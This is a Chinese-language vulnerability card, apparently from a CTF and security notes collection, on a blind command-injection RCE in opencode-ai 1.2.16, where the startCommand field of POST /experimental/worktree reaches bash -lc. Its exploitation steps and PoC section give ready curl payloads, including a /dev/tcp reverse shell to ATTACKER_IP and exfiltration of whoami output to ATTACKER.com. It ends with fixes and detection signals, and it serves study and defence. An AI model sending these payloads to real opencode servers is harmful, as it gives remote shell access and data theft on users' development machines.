---
id: web-nodejs-opencode-ai-worktree-startcommand-bash-rce
title: opencode-ai 1.2.16 /experimental/worktree：startCommand 进 bash -lc 的盲 RCE
type: scenario
domain: web
path: web/nodejs
technique: opencode-ai-worktree-startcommand-bash-rce
aliases:
- opencode-ai
- /experimental/worktree
- startCommand
- bash -lc
- Bun Shell
- worktree RCE
tags:
- nodejs
- bun
- command-injection
- opencode
- worktree
- blind-rce
- ctf
cve: []
severity: high
confidence: high
status: verified
affected_versions: opencode-ai 1.2.16（原文源码审计）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:11:24+08:00'
  notes: '已对照原文截图核对：experimental.ts:91-115 路由、Worktree.create.schema 的 startCommand: z.string().optional()、extra=startCommand.trim()、runStartScripts/runStartScript/runStartCommand、$`bash -lc ${cmd}` 与 setTimeout 盲执行均一致；affected_versions 已标 opencode-ai 1.2.16；未实际运行 PoC。'
---

## 一句话结论

`opencode-ai@1.2.16` 的 `POST /experimental/worktree` 接受 `startCommand`（仅 `z.string().optional()`），把它作为 `extra` 传到 `runStartCommand` 的 `$`bash -lc ${cmd}``；Bun Shell 的转义把参数当成单个字符串，但 `bash -lc` 会把该字符串当命令解析，所以任意命令执行；`setTimeout` 异步执行导致无回显（盲 RCE）。

## 原理

- **入口**：`server/routes/experimental.ts` 的 `/worktree` 路由用 `validator("json", Worktree.create.schema)` 校验；schema 中 `startCommand: z.string().optional()`，没有字符/长度/危险命令过滤。
- **传递链**：`Worktree.create(body)` 取出 `extra = input?.startCommand?.trim()`，在 `setTimeout` 里 `await runStartScripts(info.directory, { projectID, extra })`；`runStartScripts` 先跑项目自身的 start 命令，再 `runStartScript(directory, extra, "worktree")`；最终 `runStartCommand(directory, cmd)`。
- **危险执行**：Linux 分支 `return $\`bash -lc ${cmd}\`.nothrow().cwd(directory)`。Bun Shell 会把 `${cmd}` 转义后作为 `bash -lc` 的一个参数，但 `bash -lc` 的语义就是“把参数当命令串执行”，因此转义并不能阻止命令执行。
- **前置条件**：`Instance.project.vcs === "git"` 才会创建 worktree；`git reset --hard` 与 `Instance.provide` 成功后才执行 start scripts；项目自身的 start 命令失败时，`runStartScripts` 会提前返回，`extra` 可能不执行。
- **盲执行**：`startCommand` 在 `setTimeout(..., 0)` 中异步执行，HTTP 响应在命令执行前就返回；命令输出不回显，错误只进服务端日志。利用时用反弹 shell 或 OOB（`curl http://attacker/$(whoami)`）确认。
- **Windows 分支**：`process.platform === "win32"` 时走 `$`cmd /c ${cmd}``，同样可注入。

## 触发条件

- 目标运行 `opencode-ai@1.2.16`，`/experimental/worktree` 可访问（默认监听 4096）。
- opencode 服务位于一个 git 项目目录中（正常使用场景）。
- 攻击者能发 POST JSON（本机、内网或能绕过 no-cors 限制的入口）。
- 服务进程有执行 shell 的权限。

## 利用步骤

1. 确认路由：`POST /experimental/worktree`，body `{"name":"test"}` 观察是否创建 worktree/返回 JSON。
2. 基本命令执行：`{"name":"test","startCommand":"id > /tmp/pwned"}`，通过文件/带外确认。
3. 反弹 shell：`{"name":"rce","startCommand":"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"}`。
4. 带外数据：`{"name":"exfil","startCommand":"curl http://ATTACKER/$(whoami)"}`。
5. 若项目 start 命令失败导致 extra 不执行，先让项目处于可启动状态或改用在项目配置中的 start 命令。
6. 读取 flag/敏感文件；无回显时用 DNS/HTTP 外带或写入 Web 可访问目录。

## PoC

```bash
curl -X POST http://127.0.0.1:4096/experimental/worktree \
  -H "Content-Type: application/json" \
  -d '{"name":"test","startCommand":"id > /tmp/pwned"}'

curl -X POST http://127.0.0.1:4096/experimental/worktree \
  -H "Content-Type: application/json" \
  -d '{"name":"rce","startCommand":"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"}'

curl -X POST http://127.0.0.1:4096/experimental/worktree \
  -H "Content-Type: application/json" \
  -d '{"name":"exfil","startCommand":"curl http://ATTACKER.com/$(whoami)"}'
```

## 变体与关联

- **执行链变体**：`runStartScript` 还接受项目配置中的 start 命令；若攻击者能改项目配置/仓库文件，也能注入。
- **平台变体**：Linux `bash -lc`、Windows `cmd /c`；其他 shell 包装（`sh -c`、`zsh -c`）同理。
- **回显变体**：盲 RCE 用反弹 shell、HTTP/DNS 外带、写文件到静态目录；若能读日志，也可从错误日志取输出。
- **关联卡片**：[[web-nodejs-opencode-ai-file-find-raw-shell-injection]]（同产品 GET 注入）、[[web-generic-ssrf-bot-pages-dev-allowlist-internal-service]]（内网触发链，但 no-cors 下 POST JSON 受限）、[[web-nodejs-strapi-plugin-install-command-injection]]（Node 命令拼接）、[[web-java-rce-spring-actionnetworkcmd-ip-time-sh-c]]（sh -c 拼接）。
- **边界**：若服务不是 git 项目、项目 start 命令失败、或路由被认证/网络隔离，利用不成立；`bash -lc` 的转义不能替代参数化。

## 检测与防御

- **修复**：不要把用户输入交给 `bash -lc`/`cmd /c`；用 `spawn`/`execFile` 传 argv 数组；对 `startCommand` 做 allowlist 或只允许项目配置中的命令。
- **权限**：`/experimental/worktree` 加认证/授权，默认只监听 127.0.0.1；限制可创建 worktree 的用户。
- **检测信号**：`/experimental/worktree` 的 `startCommand` 含 `bash -i`、`/dev/tcp`、`curl`、`id` 等；进程树出现 `bash -lc` 子进程；worktree 目录异常创建。
